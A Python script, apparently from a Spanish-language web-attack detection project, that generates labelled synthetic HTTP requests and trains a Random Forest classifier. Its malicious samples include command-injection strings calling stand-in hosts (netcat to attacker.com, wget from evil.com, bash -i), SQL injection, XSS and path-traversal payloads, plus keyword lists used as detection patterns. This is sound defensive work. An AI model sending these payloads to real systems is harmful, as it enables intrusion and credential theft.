#!/usr/bin/env python3
"""
Némesis IA - Brain Training System V2
Versión mejorada con más features y mejor dataset

Mejoras respecto a v1:
- 5 features en lugar de 3
- Mejor detección de command injection
- Normalización de URL encoding
- Feature: número de palabras SQL/XSS/CMD

Copyright (C) 2025 Némesis AI Project Contributors
Licensed under GPL-3.0
"""

import logging
import random
import math
import re
from collections import Counter
from pathlib import Path
from typing import List, Tuple, Dict
from datetime import datetime
from urllib.parse import unquote

import joblib
import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import (
    accuracy_score,
    precision_score,
    recall_score,
    f1_score,
    confusion_matrix,
)

logger = logging.getLogger(__name__)


class FeatureExtractorV2:
    """
    Extractor mejorado con 5 features
    
    Features:
    1. Length: Longitud del payload
    2. Special Ratio: Ratio de caracteres especiales
    3. Entropy: Entropía de Shannon
    4. SQL Keywords: Número de palabras SQL sospechosas
    5. Suspicious Patterns: Patrones de ataque (XSS, CMD, etc)
    """
    
    # Keywords sospechosos
    SQL_KEYWORDS = [
        'select', 'union', 'insert', 'update', 'delete', 'drop',
        'create', 'alter', 'exec', 'execute', 'script', 'declare',
        'waitfor', 'delay', 'benchmark', 'sleep'
    ]
    
    XSS_PATTERNS = [
        '<script', 'javascript:', 'onerror', 'onload', 'onclick',
        'onmouseover', '<iframe', '<embed', '<object', 'document.cookie'
    ]
    
    CMD_PATTERNS = [
        'cat ', 'ls ', 'pwd', 'whoami', 'id', 'uname', 'wget',
        'curl', 'nc ', 'netcat', 'bash', 'sh ', '/bin/', '/etc/passwd',
        '/etc/shadow', 'ping ', 'nslookup'
    ]
    
    @staticmethod
    def normalize_payload(payload: str) -> str:
        """
        Normaliza el payload decodificando URL encoding
        
        Esto ayuda a que "python+tutorial" se vea como "python tutorial"
        y no active falsos positivos.
        """
        try:
            # Decodificar URL encoding
            decoded = unquote(payload)
            # Reemplazar + por espacio (encoding de espacios en query strings)
            decoded = decoded.replace('+', ' ')
            return decoded
        except Exception:
            return payload
    
    @staticmethod
    def count_sql_keywords(text: str) -> int:
        """Cuenta palabras clave SQL en el texto"""
        text_lower = text.lower()
        count = sum(1 for keyword in FeatureExtractorV2.SQL_KEYWORDS 
                   if keyword in text_lower)
        return count
    
    @staticmethod
    def count_suspicious_patterns(text: str) -> int:
        """
        Cuenta patrones sospechosos (XSS, CMD, Path Traversal)
        """
        text_lower = text.lower()
        count = 0
        
        # XSS patterns
        count += sum(1 for pattern in FeatureExtractorV2.XSS_PATTERNS 
                    if pattern.lower() in text_lower)
        
        # CMD patterns
        count += sum(1 for pattern in FeatureExtractorV2.CMD_PATTERNS 
                    if pattern.lower() in text_lower)
        
        # Path traversal
        if '../' in text or '..\\' in text or '..%2f' in text_lower:
            count += 2  # Peso mayor para path traversal
        
        # Command injection operators
        cmd_operators = [';', '|', '&', '`', '$']
        # Solo contar si están seguidos de comandos comunes
        for op in cmd_operators:
            if op in text:
                # Verificar si hay comando después
                parts = text.split(op)
                for part in parts[1:]:  # Partes después del operador
                    if any(cmd in part.lower() for cmd in ['cat', 'ls', 'whoami', 'id', 'pwd']):
                        count += 3  # Peso alto para command injection
        
        return count
    
    @staticmethod
    def extract_features(payload: str) -> List[float]:
        """
        Extrae 5 features mejoradas
        
        Args:
            payload: String del request HTTP
            
        Returns:
            Lista de 5 features numéricas
        """
        # Normalizar payload (decodificar URL encoding)
        normalized = FeatureExtractorV2.normalize_payload(payload)
        
        # Feature 1: Longitud
        length = len(normalized)
        
        # Feature 2: Ratio de caracteres especiales
        special_chars = "'\"<>;()[]{}|&$`\\"
        special_count = sum(c in special_chars for c in normalized)
        special_ratio = special_count / max(length, 1)
        
        # Feature 3: Entropía de Shannon
        entropy = FeatureExtractorV2.calculate_entropy(normalized)
        
        # Feature 4: Número de SQL keywords
        sql_keywords_count = FeatureExtractorV2.count_sql_keywords(normalized)
        
        # Feature 5: Patrones sospechosos (XSS, CMD, Path Traversal)
        suspicious_patterns_count = FeatureExtractorV2.count_suspicious_patterns(normalized)
        
        return [
            length,
            special_ratio,
            entropy,
            sql_keywords_count,
            suspicious_patterns_count
        ]
    
    @staticmethod
    def calculate_entropy(text: str) -> float:
        """Calcula entropía de Shannon"""
        if not text:
            return 0.0
        
        counts = Counter(text)
        length = len(text)
        
        entropy = -sum(
            (count / length) * math.log2(count / length)
            for count in counts.values()
        )
        
        return entropy
    
    @staticmethod
    def extract_features_batch(payloads: List[str]) -> np.ndarray:
        """Extrae features de múltiples payloads"""
        features = [
            FeatureExtractorV2.extract_features(payload) 
            for payload in payloads
        ]
        return np.array(features)


class DatasetGeneratorV2:
    """
    Generador mejorado con más variedad en command injection
    """
    
    def __init__(self, n_samples: int = 10000) -> None:
        self.n_samples = n_samples
        self.n_legitimate = int(n_samples * 0.6)
        self.n_malicious = n_samples - self.n_legitimate
        
        self.n_sqli = int(self.n_malicious * 0.35)
        self.n_xss = int(self.n_malicious * 0.30)
        self.n_path_traversal = int(self.n_malicious * 0.20)
        self.n_cmd_injection = self.n_malicious - (
            self.n_sqli + self.n_xss + self.n_path_traversal
        )
        
        logger.info(f"DatasetGeneratorV2 initialized: {n_samples} samples")
    
    def generate_legitimate_traffic(self) -> List[str]:
        """Genera tráfico legítimo con más variedad"""
        samples = []
        
        legitimate_paths = [
            "/index.html", "/about.html", "/contact.html", "/products.html",
            "/api/users", "/api/products", "/dashboard", "/login",
            "/register", "/profile", "/settings", "/search", "/blog", "/docs"
        ]
        
        legitimate_params = [
            "id=123", "page=1", "limit=10", "sort=name", "filter=active",
            "q=python+tutorial",  # URL encoded search
            "q=machine+learning",
            "q=web+development",
            "search=react+hooks",
            "query=data+science",
            "category=electronics", "price=100", "color=blue", "size=medium"
        ]
        
        for _ in range(self.n_legitimate):
            path = random.choice(legitimate_paths)
            
            if random.random() < 0.7:
                params = random.sample(legitimate_params, random.randint(1, 3))
                payload = f"GET {path}?{'&'.join(params)} HTTP/1.1"
            else:
                payload = f"GET {path} HTTP/1.1"
            
            samples.append(payload)
        
        return samples
    
    def generate_command_injection(self) -> List[str]:
        """
        Genera command injection con más variedad y realismo
        
        Incluye casos con IPs válidas + comandos
        """
        samples = []
        
        # Comandos más variados
        cmd_patterns = [
            "; ls -la",
            "| whoami",
            "& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; pwd",
            "| cat /etc/shadow",
            "&& ls /tmp",
            "; uname -a",
            "| nc attacker.com 4444",
            "`wget http://evil.com/malware`",
            "$(cat /etc/passwd)",
            "; sleep 10",
            "| bash -i",
            "& /bin/sh",
            # Casos con IPs + comandos (como el Test 9)
            "; cat /etc/passwd",
            "| cat /etc/shadow",
            "&& whoami",
            "; id",
            "| pwd",
        ]
        
        paths = ["/ping", "/exec", "/run", "/command", "/system", "/shell"]
        
        # Hosts realistas para ping
        hosts = [
            "127.0.0.1", "192.168.1.1", "10.0.0.1", "8.8.8.8",
            "localhost", "google.com", "example.com"
        ]
        
        for _ in range(self.n_cmd_injection):
            path = random.choice(paths)
            
            # 50% con host + comando, 50% solo comando
            if random.random() < 0.5:
                host = random.choice(hosts)
                cmd = random.choice(cmd_patterns)
                payload = f"GET {path}?host={host}{cmd} HTTP/1.1"
            else:
                cmd = random.choice(cmd_patterns)
                payload = f"GET {path}?cmd=hostname{cmd} HTTP/1.1"
            
            samples.append(payload)
        
        return samples
    
    def generate_sql_injection(self) -> List[str]:
        """Misma implementación que v1"""
        samples = []
        sqli_patterns = [
            "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", "admin' --",
            "' UNION SELECT NULL--", "' UNION SELECT * FROM users--",
            "'; DROP TABLE users--", "1' AND '1'='1", "1' AND '1'='2",
            "' OR 'a'='a", "') OR ('1'='1", "' OR '1'='1'/*", "admin'/*",
            "' UNION ALL SELECT NULL,NULL--", "1' ORDER BY 1--",
            "1' ORDER BY 10--", "' WAITFOR DELAY '00:00:05'--",
        ]
        
        paths = ["/login", "/search", "/profile", "/api/user"]
        
        for _ in range(self.n_sqli):
            path = random.choice(paths)
            pattern = random.choice(sqli_patterns)
            
            if random.random() < 0.3:
                pattern = pattern.replace("'", "%27").replace(" ", "%20")
            
            payload = f"GET {path}?user={pattern} HTTP/1.1"
            samples.append(payload)
        
        return samples
    
    def generate_xss(self) -> List[str]:
        """Misma implementación que v1"""
        samples = []
        xss_patterns = [
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<script>document.location='http://evil.com'</script>",
            "<img src='x' onerror='alert(1)'>",
            "<input onfocus=alert(1) autofocus>",
        ]
        
        paths = ["/search", "/comment", "/profile", "/post"]
        
        for _ in range(self.n_xss):
            path = random.choice(paths)
            pattern = random.choice(xss_patterns)
            
            if random.random() < 0.3:
                pattern = pattern.replace("<", "%3C").replace(">", "%3E")
            
            payload = f"GET {path}?q={pattern} HTTP/1.1"
            samples.append(payload)
        
        return samples
    
    def generate_path_traversal(self) -> List[str]:
        """Misma implementación que v1"""
        samples = []
        traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..//..//..//etc/passwd",
            "../../../../../../etc/passwd",
        ]
        
        paths = ["/download", "/file", "/image", "/document"]
        
        for _ in range(self.n_path_traversal):
            path = random.choice(paths)
            pattern = random.choice(traversal_patterns)
            payload = f"GET {path}?file={pattern} HTTP/1.1"
            samples.append(payload)
        
        return samples
    
    def generate_dataset(self) -> Tuple[List[str], List[int]]:
        """Genera dataset completo"""
        logger.info("🧪 Generando dataset sintético V2...")
        
        payloads = []
        labels = []
        
        legitimate = self.generate_legitimate_traffic()
        payloads.extend(legitimate)
        labels.extend([0] * len(legitimate))
        
        sqli = self.generate_sql_injection()
        payloads.extend(sqli)
        labels.extend([1] * len(sqli))
        
        xss = self.generate_xss()
        payloads.extend(xss)
        labels.extend([1] * len(xss))
        
        path_trav = self.generate_path_traversal()
        payloads.extend(path_trav)
        labels.extend([1] * len(path_trav))
        
        cmd_inj = self.generate_command_injection()
        payloads.extend(cmd_inj)
        labels.extend([1] * len(cmd_inj))
        
        combined = list(zip(payloads, labels))
        random.shuffle(combined)
        payloads, labels = zip(*combined)
        
        logger.info(
            f"✅ Dataset V2 generado: {len(payloads)} muestras "
            f"({labels.count(0)} legítimas, {labels.count(1)} maliciosas)"
        )
        
        return list(payloads), list(labels)


def train_model_v2(
    output_path: str = "models/nemesis_brain_v2.joblib",
    n_samples: int = 10000,
    test_size: float = 0.2
) -> Dict:
    """
    Entrena modelo V2 con features mejoradas
    """
    logger.info("=" * 60)
    logger.info("🚀 ENTRENAMIENTO V2 CON FEATURES MEJORADAS")
    logger.info("=" * 60)
    
    # Generar dataset
    generator = DatasetGeneratorV2(n_samples=n_samples)
    payloads, labels = generator.generate_dataset()
    
    # Extraer features (V2 con 5 features)
    logger.info("🔧 Extrayendo features V2 (5 features)...")
    extractor = FeatureExtractorV2()
    X = extractor.extract_features_batch(payloads)
    y = np.array(labels)
    
    # Split
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=test_size, random_state=42, stratify=y
    )
    
    logger.info(f"📊 Dataset split: {len(X_train)} train, {len(X_test)} test")
    
    # Entrenar
    logger.info("🧠 Entrenando Random Forest...")
    model = RandomForestClassifier(
        n_estimators=100,
        max_depth=20,
        min_samples_split=5,
        random_state=42,
        n_jobs=-1,
        class_weight='balanced'
    )
    
    start_time = datetime.now()
    model.fit(X_train, y_train)
    training_time = (datetime.now() - start_time).total_seconds()
    
    # Evaluar
    test_predictions = model.predict(X_test)
    test_accuracy = accuracy_score(y_test, test_predictions)
    test_precision = precision_score(y_test, test_predictions)
    test_recall = recall_score(y_test, test_predictions)
    test_f1 = f1_score(y_test, test_predictions)
    
    cm = confusion_matrix(y_test, test_predictions)
    tn, fp, fn, tp = cm.ravel()
    
    # Feature importances
    feature_names = ['length', 'special_ratio', 'entropy', 'sql_keywords', 'suspicious_patterns']
    feature_importances = dict(zip(feature_names, model.feature_importances_))
    
    metrics = {
        'training_time': training_time,
        'test_accuracy': test_accuracy,
        'test_precision': test_precision,
        'test_recall': test_recall,
        'test_f1': test_f1,
        'confusion_matrix': {
            'true_negatives': int(tn),
            'false_positives': int(fp),
            'false_negatives': int(fn),
            'true_positives': int(tp),
        },
        'feature_importances': feature_importances,
    }
    
    # Log
    logger.info("=" * 60)
    logger.info("📊 MÉTRICAS V2")
    logger.info("=" * 60)
    logger.info(f"Training Time:      {training_time:.2f}s")
    logger.info(f"Test Accuracy:      {test_accuracy:.4f}")
    logger.info(f"Precision:          {test_precision:.4f}")
    logger.info(f"Recall:             {test_recall:.4f}")
    logger.info(f"F1 Score:           {test_f1:.4f}")
    logger.info("")
    logger.info("Confusion Matrix:")
    logger.info(f"  TN: {tn:5d}  |  FP: {fp:5d}")
    logger.info(f"  FN: {fn:5d}  |  TP: {tp:5d}")
    logger.info("")
    logger.info("Feature Importances:")
    for feature, importance in feature_importances.items():
        logger.info(f"  {feature:20s}: {importance:.4f}")
    logger.info("=" * 60)
    
    # Guardar
    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    joblib.dump(model, output_path)
    logger.info(f"💾 Modelo V2 guardado en {output_path}")
    
    return metrics


def main():
    """Función principal"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    metrics = train_model_v2(
        output_path="models/nemesis_brain_v2.joblib",
        n_samples=10000
    )
    
    print("\n🎉 Modelo V2 entrenado exitosamente!")
    print(f"\n📈 Accuracy: {metrics['test_accuracy']:.2%}")
    print(f"🎯 Precision: {metrics['test_precision']:.2%}")
    print(f"🔍 Recall: {metrics['test_recall']:.2%}")
    print(f"⚖️  F1 Score: {metrics['test_f1']:.2%}")


if __name__ == "__main__":
    main()